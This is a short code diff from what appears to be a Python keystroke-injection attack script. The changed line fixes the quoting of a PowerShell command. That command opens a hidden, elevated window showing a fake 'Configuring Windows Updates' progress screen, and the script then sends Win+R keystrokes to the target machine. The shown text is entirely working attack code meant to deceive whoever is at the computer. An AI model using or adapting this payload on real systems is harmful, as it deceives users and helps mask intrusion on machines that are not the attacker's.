@@ -37,7 +37,7 @@ def run_attack():
         return
 
     # PowerShell command to create a fake update screen
-    ps_command = "powershell -WindowStyle Hidden -command \\"Start-Process powershell -ArgumentList '-NoExit -Command Write-Host \\'Installing critical updates, do not turn off your computer...\\'; for($i=0; $i -le 100; $i++) { Write-Progress -Activity \\'Configuring Windows Updates\\' -Status \\"$i% Complete\\" -PercentComplete $i; Start-Sleep -Milliseconds 300; }' -Verb RunAs\\""
+    ps_command = '''powershell -WindowStyle Hidden -command "Start-Process powershell -ArgumentList '-NoExit -Command Write-Host \\'Installing critical updates, do not turn off your computer...\\'; for($i=0; $i -le 100; $i++) { Write-Progress -Activity \\'Configuring Windows Updates\\' -Status \\"$i% Complete\\" -PercentComplete $i; Start-Sleep -Milliseconds 300; }' -Verb RunAs"'''
     
     try:
         hid_helper.press_modifier_key(hid_helper.keyboard.left_gui, hid_helper.keyboard.r) # Win+R
